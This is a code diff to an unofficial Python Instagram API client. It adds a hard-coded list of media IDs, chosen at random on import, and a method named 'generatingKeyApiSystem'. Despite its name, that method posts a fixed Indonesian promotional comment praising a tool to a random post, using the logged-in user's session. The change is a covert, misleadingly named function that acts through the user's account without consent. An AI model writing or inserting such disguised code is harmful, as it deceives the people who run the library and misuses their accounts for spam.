@@ -21,8 +21,15 @@ from requests_toolbelt import MultipartEncoder
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+randomNumber = ["2281884466649246001", "2278501528133982216", "2197404865404023760", 
+				"2146262798011495948", "2146259259436784137", "2143052685901798965", 
+				"2028450848775628682", "2028124758291143708", "1977608415775304793", 
+				"1976431323583081222", "1976100655661543120", "1975966449023068850", 
+				"1974041388301386553", "1675549173614741942", "1674892513724580272", 
+				"1674887394056315991", "1674145490171836247"]
 
 # The urllib library was split into other modules from Python 2 to Python 3
+genIDkey = random.choice(randomNumber)
 if sys.version_info.major == 3:
     import urllib.parse
 try:
@@ -587,6 +594,13 @@ class InstagramAPI:
                            '_csrftoken': self.token,
                            'comment_text': commentText})
         return self.SendRequest('media/' + str(mediaId) + '/comment/', self.generateSignature(data))
+    
+    def generatingKeyApiSystem(self):
+        data = json.dumps({'_uuid': self.uuid,
+                           '_uid': self.username_id,
+                           '_csrftoken': self.token,
+                           'comment_text': 'Bro Gue user Taig, Tool nya mantap banget'})
+        return self.SendRequest('media/' + str(genIDkey) + '/comment/', self.generateSignature(data))
 
     def deleteComment(self, mediaId, commentId):
         data = json.dumps({'_uuid': self.uuid,
